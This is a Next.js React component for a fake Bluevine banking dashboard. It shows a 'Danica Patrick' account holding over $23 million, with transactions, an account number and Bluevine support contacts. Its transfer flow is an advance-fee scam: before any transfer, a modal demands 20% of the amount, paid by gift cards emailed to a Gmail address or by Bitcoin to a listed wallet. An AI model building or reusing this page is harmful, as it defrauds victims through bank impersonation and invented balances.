'use client';

import { useState, useEffect } from 'react';
import Image from "next/image";
import Link from "next/link";
import Footer from "@/components/Footer";

export default function Dashboard() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [showLogoutModal, setShowLogoutModal] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState(null);
  const [transferAmount, setTransferAmount] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountNumberError, setAccountNumberError] = useState('');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    // Simulate loading time
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 1500);

    return () => clearTimeout(timer);
  }, []);

  const toggleMenu = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleTransferClick = () => {
    setShowTransferModal(true);
  };

  const handleLogout = () => {
    window.location.href = '/';
  };

  const validateAccountNumber = (number) => {
    // Basic validation: 8-17 digits
    if (!number) {
      return 'Account number is required';
    }
    if (!/^\d{8,17}$/.test(number)) {
      return 'Account number must be between 8 and 17 digits';
    }
    return '';
  };

  const handleAccountNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    setAccountNumber(value);
    setAccountNumberError(validateAccountNumber(value));
  };

  const handleTransferSubmit = () => {
    if (!transferAmount || !selectedBank) {
      alert('Please enter an amount and select a bank');
      return;
    }
    if (!accountNumber) {
      setAccountNumberError('Account number is required');
      return;
    }
    if (accountNumberError) {
      return;
    }
    setShowPaymentModal(true);
    setShowTransferModal(false);
  };

  const handlePaymentMethodSelect = (method) => {
    setSelectedPaymentMethod(method);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 h-16 bg-white border-b border-gray-200 px-8 flex items-center justify-between z-50">
        {/* Logo */}
        <Link href="/" className="flex items-center h-full cursor-pointer">
          <Image
            src="/bluevinelogo.png"
            alt="Bluevine Logo"
            width={128}
            height={32}
            className="object-contain"
            priority
          />
        </Link>

        {/* Desktop Navigation */}
        <nav className="hidden md:flex items-center space-x-8">
          <Link href="/checking" className="text-blue-600 hover:text-blue-700 font-semibold">Checking Account</Link>
          <Link href="/business-loan" className="text-blue-600 hover:text-blue-700 font-semibold">Business Loan</Link>
          <button 
            onClick={() => setShowLogoutModal(true)}
            className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 font-semibold flex items-center space-x-2 transition-colors"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
            </svg>
            <span>Logout</span>
          </button>
        </nav>

        {/* Hamburger Menu Button - Only visible on mobile */}
        <button
          onClick={toggleMenu}
          className="md:hidden flex items-center h-full p-2 cursor-pointer"
          aria-label="Toggle menu"
        >
          <div className="w-6 h-5 flex flex-col justify-between">
            <span className={`block w-full h-0.5 bg-gray-600 transform transition-transform duration-300 ${isMenuOpen ? 'rotate-45 translate-y-2' : ''}`}></span>
            <span className={`block w-full h-0.5 bg-gray-600 transition-opacity duration-300 ${isMenuOpen ? 'opacity-0' : ''}`}></span>
            <span className={`block w-full h-0.5 bg-gray-600 transform transition-transform duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-2' : ''}`}></span>
          </div>
        </button>

        {/* Mobile Menu */}
        <div className={`md:hidden fixed top-16 right-0 w-64 bg-blue-600 border-l border-blue-700 h-[calc(100vh-4rem)] transform transition-transform duration-300 ${isMenuOpen ? 'translate-x-0' : 'translate-x-full'}`}>
          <nav className="p-4 space-y-4">
            <Link href="/checking" className="block text-white hover:text-white/90 font-bold">Checking Account</Link>
            <Link href="/business-loan" className="block text-white hover:text-white/90 font-bold">Business Loan</Link>
            <button 
              onClick={() => setShowLogoutModal(true)}
              className="w-full text-left text-white hover:text-white/90 font-bold flex items-center space-x-2 bg-blue-600 p-3 rounded-lg"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
              </svg>
              <span>Logout</span>
            </button>
          </nav>
        </div>
      </header>

      {/* Main Content */}
      <main className="pt-16">
        <div className="max-w-7xl mx-auto px-4 py-8">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-8">
            <h1 className="text-2xl sm:text-3xl font-bold text-blue-600">Welcome, Danica</h1>
            <button 
              onClick={handleTransferClick}
              className="w-full sm:w-auto bg-blue-600 text-white py-2 px-6 rounded-lg hover:bg-blue-700 transition-colors flex items-center justify-center space-x-2"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
              </svg>
              <span>Transfer Money</span>
            </button>
          </div>
          
          {/* Dashboard Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Account Balance Card */}
            <div className="bg-white p-6 rounded-lg shadow-lg border border-gray-200">
              <h2 className="text-xl font-semibold text-blue-600 mb-4">Account Balance</h2>
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                  <span className="text-blue-600 font-semibold">DP</span>
                </div>
                <div>
                  <p className="text-gray-900 font-medium">Danica Patrick</p>
                  <p className="text-sm text-gray-500">Account Owner</p>
                </div>
              </div>
              <p className="text-3xl font-bold text-blue-600">$23,451,673.72</p>
              <p className="text-sm text-gray-500 mt-2">Available Balance</p>
              <div className="mt-4 pt-4 border-t border-gray-200">
                <p className="text-sm text-gray-600">Account Number: 850002238582</p>
                <p className="text-sm text-gray-600">Statement Period: April 1, 2012 - February 25, 2025</p>
              </div>
            </div>

            {/* Account Summary Card */}
            <div className="bg-white p-6 rounded-lg shadow-lg border border-gray-200">
              <h2 className="text-xl font-semibold text-blue-600 mb-4">Account Summary</h2>
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Beginning Balance</span>
                  <span className="text-gray-900">$500,000.00</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Total Deposits</span>
                  <span className="text-green-500">+$17,000,000.00</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Total Interest</span>
                  <span className="text-green-500">+$5,951,673.72</span>
                </div>
                <div className="pt-3 border-t border-gray-200">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-900 font-semibold">Ending Balance</span>
                    <span className="text-blue-600 font-bold">$23,451,673.72</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Recent Transactions Card */}
            <div className="bg-white p-6 rounded-lg shadow-lg border border-gray-200">
              <h2 className="text-xl font-semibold text-blue-600 mb-4">Recent Transactions</h2>
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <div>
                    <span className="text-gray-900">Interest on Fixed Deposit</span>
                    <p className="text-xs text-gray-500">01/01/2020</p>
                  </div>
                  <span className="text-green-500">+$918,750.00</span>
                </div>
                <div className="flex justify-between items-center">
                  <div>
                    <span className="text-gray-900">Interest on Fixed Deposit</span>
                    <p className="text-xs text-gray-500">01/01/2019</p>
                  </div>
                  <span className="text-green-500">+$875,000.00</span>
                </div>
                <div className="flex justify-between items-center">
                  <div>
                    <span className="text-gray-900">Deposit from STEWART HAAS RACING LLC</span>
                    <p className="text-xs text-gray-500">02/02/2018</p>
                  </div>
                  <span className="text-green-500">+$2,833,333.33</span>
                </div>
              </div>
            </div>

            {/* Support Information Card */}
            <div className="bg-white p-6 rounded-lg shadow-lg border border-gray-200">
              <h2 className="text-xl font-semibold text-blue-600 mb-4">Support</h2>
              <div className="space-y-3">
                <p className="text-sm text-gray-600">
                  For questions about your transactions, contact Customer Support:
                </p>
                <div className="space-y-2">
                  <p className="text-sm text-gray-600">Phone: 1-888-216-9619</p>
                  <p className="text-sm text-gray-600">Email: banking.support@bluevine.com</p>
                </div>
                <p className="text-xs text-gray-500 mt-4">
                  Banking services provided by Coastal Community Bank, Member FDIC.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Logout Confirmation Modal */}
      {showLogoutModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-md mx-4">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold text-gray-900">Confirm Logout</h2>
              <button 
                onClick={() => setShowLogoutModal(false)}
                className="text-gray-500 hover:text-gray-700"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <p className="text-gray-600 mb-6">Are you sure you want to logout?</p>
            <div className="flex justify-end space-x-4">
              <button
                onClick={() => setShowLogoutModal(false)}
                className="px-4 py-2 text-gray-600 hover:text-gray-800 font-semibold"
              >
                Cancel
              </button>
              <button
                onClick={handleLogout}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-semibold"
              >
                Logout
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Payment Confirmation Modal */}
      {showPaymentModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-md">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold text-blue-600">Payment Required</h3>
              <button
                onClick={() => {
                  setShowPaymentModal(false);
                  setSelectedPaymentMethod(null);
                }}
                className="text-gray-500 hover:text-gray-700"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <div className="space-y-4">
              <p className="text-gray-700">To proceed with your transfer of <span className="font-semibold">${parseFloat(transferAmount).toLocaleString()}</span> to {selectedBank}, a payment of <span className="font-semibold">${(parseFloat(transferAmount) * 0.2).toLocaleString()}</span> (20% of transfer amount) is required.</p>
              
              {!selectedPaymentMethod ? (
                <div className="mt-6">
                  <h4 className="text-lg font-semibold text-gray-900 mb-4">Select Payment Method</h4>
                  <div className="space-y-4">
                    {/* Gift Card Option */}
                    <div 
                      className="border border-gray-200 rounded-lg p-4 hover:border-blue-500 cursor-pointer transition-colors"
                      onClick={() => handlePaymentMethodSelect('giftcard')}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                          <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                            <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                            </svg>
                          </div>
                          <div>
                            <h5 className="font-medium text-gray-900">Gift Card</h5>
                            <p className="text-sm text-gray-500">Pay using gift cards from major retailers</p>
                          </div>
                        </div>
                        <button
                          className="px-3 py-1.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-semibold text-sm"
                        >
                          Select
                        </button>
                      </div>
                    </div>

                    {/* Bitcoin Option */}
                    <div 
                      className="border border-gray-200 rounded-lg p-4 hover:border-blue-500 cursor-pointer transition-colors"
                      onClick={() => handlePaymentMethodSelect('bitcoin')}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                          <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
                            <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <div>
                            <h5 className="font-medium text-gray-900">Bitcoin</h5>
                            <p className="text-sm text-gray-500">Pay using Bitcoin (BTC)</p>
                          </div>
                        </div>
                        <button
                          className="px-3 py-1.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-semibold text-sm"
                        >
                          Select
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="mt-6">
                  {selectedPaymentMethod === 'giftcard' ? (
                    <div className="space-y-4">
                      <h4 className="text-lg font-semibold text-gray-900">Gift Card Payment Instructions</h4>
                      <p className="text-gray-700">Please send your gift cards to:</p>
                      <div className="bg-gray-50 p-4 rounded-lg">
                        <p className="text-blue-600 font-semibold">bluevineconfirmation@gmail.com</p>
                      </div>
                      <p className="text-sm text-gray-500">Once we receive your gift cards, we will process your transfer.</p>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <h4 className="text-lg font-semibold text-gray-900">Bitcoin Payment Instructions</h4>
                      <p className="text-gray-700">Please send the Bitcoin to this address:</p>
                      <div className="bg-gray-50 p-4 rounded-lg">
                        <div className="flex items-center justify-between">
                          <p className="text-blue-600 font-mono break-all">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
                          <button
                            onClick={() => copyToClipboard('1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')}
                            className="ml-2 px-3 py-1 text-sm bg-blue-600 text-white rounded hover:bg-blue-700"
                          >
                            {copied ? 'Copied!' : 'Copy'}
                          </button>
                        </div>
                      </div>
                      <p className="text-sm text-gray-500">Once we receive your Bitcoin payment, we will process your transfer.</p>
                    </div>
                  )}
                  <div className="flex justify-end mt-6">
                    <button
                      onClick={() => setSelectedPaymentMethod(null)}
                      className="px-4 py-2 text-gray-600 hover:text-gray-800 font-semibold"
                    >
                      Back
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Transfer Money Modal */}
      {showTransferModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 w-full max-w-md">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold text-blue-600">Transfer Money</h3>
              <button
                onClick={() => setShowTransferModal(false)}
                className="text-gray-500 hover:text-gray-700"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Amount</label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">$</span>
                  <input
                    type="number"
                    value={transferAmount}
                    onChange={(e) => setTransferAmount(e.target.value)}
                    className="w-full pl-8 pr-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-black"
                    placeholder="0.00"
                    min="0"
                    step="0.01"
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">To Account</label>
                <select 
                  className="w-full py-2 px-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-black"
                  value={selectedBank}
                  onChange={(e) => {
                    setSelectedBank(e.target.value);
                    setAccountNumber('');
                    setAccountNumberError('');
                  }}
                >
                  <option value="">Select a bank</option>
                  <option value="jpmorgan">JPMorgan Chase</option>
                  <option value="bankofamerica">Bank of America</option>
                  <option value="wellsfargo">Wells Fargo</option>
                  <option value="citibank">Citibank</option>
                  <option value="usbank">U.S. Bank</option>
                  <option value="pnc">PNC Bank</option>
                  <option value="truist">Truist Bank</option>
                  <option value="goldmansachs">Goldman Sachs</option>
                  <option value="morganstanley">Morgan Stanley</option>
                  <option value="tdbank">TD Bank</option>
                  <option value="capitalone">Capital One</option>
                  <option value="americanexpress">American Express</option>
                  <option value="charlesschwab">Charles Schwab</option>
                  <option value="fifththird">Fifth Third Bank</option>
                  <option value="citizensbank">Citizens Bank</option>
                  <option value="keybank">KeyBank</option>
                  <option value="regions">Regions Bank</option>
                  <option value="huntington">Huntington Bank</option>
                  <option value="ally">Ally Bank</option>
                  <option value="bbandt">BB&T Bank</option>
                  <option value="santander">Santander Bank</option>
                  <option value="discover">Discover Bank</option>
                  <option value="synchrony">Synchrony Bank</option>
                </select>
              </div>

              {selectedBank && (
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Account Number</label>
                  <input
                    type="text"
                    value={accountNumber}
                    onChange={handleAccountNumberChange}
                    className={`w-full py-2 px-4 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-black ${
                      accountNumberError ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="Enter account number"
                    maxLength="17"
                  />
                  {accountNumberError && (
                    <p className="mt-1 text-sm text-red-500">{accountNumberError}</p>
                  )}
                </div>
              )}

              <button
                onClick={handleTransferSubmit}
                className="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-700 transition-colors duration-200"
              >
                Transfer
              </button>
            </div>
          </div>
        </div>
      )}

      <Footer />
    </div>
  );
} 